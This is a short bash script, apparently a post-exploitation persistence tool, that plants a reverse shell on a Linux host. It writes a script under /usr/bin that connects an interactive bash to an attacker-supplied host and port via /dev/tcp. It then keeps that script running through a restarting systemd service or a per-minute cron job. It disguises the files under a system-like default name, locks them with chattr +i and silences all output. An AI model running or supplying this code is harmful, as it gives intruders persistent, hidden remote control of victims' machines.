#!/bin/bash

green="\e[0;32m\033[1m"
end="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"

type=""
lhost=""
lport=""
name="debusched"

while getopts ":t:h:p:n:" option; do
    case "${option}" in
        t) type=${OPTARG} ;;
        h) lhost=${OPTARG} ;;
        p) lport=${OPTARG} ;;
        n) name=${OPTARG} ;;
        *) help_panel >&2 ;;
    esac
done

function help_panel(){
    echo -e "\n${yellow}[+] Usage ${end}\n"
    echo -e "${green}./persist.sh${end} -t ${purple}<cron|service>${end} -h ${purple}<lhost>${end} -p ${purple}<lport>${end} -n ${purple}<name>${end}\n" 
    echo -e "${yellow}Name is used for service, cron & filename, ${green}debusched${yellow} is for default${end}"
    exit 1
}

if [[ "${type}" == "" ]] || [[ "${lhost}" == "" ]] || [[ "${lport}" == "" ]];then
    help_panel
fi


#Payload creation, customize with your respective payload.
touch /usr/bin/${name}.sh
chmod +x /usr/bin/${name}.sh
echo -e "#!/bin/bash\n\n/bin/bash -c '/bin/bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'; echo ""\n" >  /usr/bin/${name}.sh



if [[ "$type" == "service" ]]; then

    (
    touch /lib/systemd/system/${name}.service
    echo -e "[Unit]\nDescription=${name}\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/bin/${name}.sh\nRestart=always\nRestartSec=30\n\n[Install]\nWantedBy=multi-user.target" > /lib/systemd/system/${name}.service

    systemctl enable ${name}.service
    systemctl daemon-reload
    systemctl start ${name}.service

    chattr +i /lib/systemd/system/${name}.service
    ) &>/dev/null


elif [[ "${type}" == "cron" ]];then
    (
        service cron start

        touch /etc/cron.d/${name}
        chmod 644 /etc/cron.d/${name}
        echo -e "* * * * *  ${USER} /usr/bin/${name}.sh" > /etc/cron.d/${name}
        chattr +i /etc/cron.d/${name}

        service cron reload
    ) &>/dev/null

else
    help_panel
fi

chattr +i /usr/bin/${name}.sh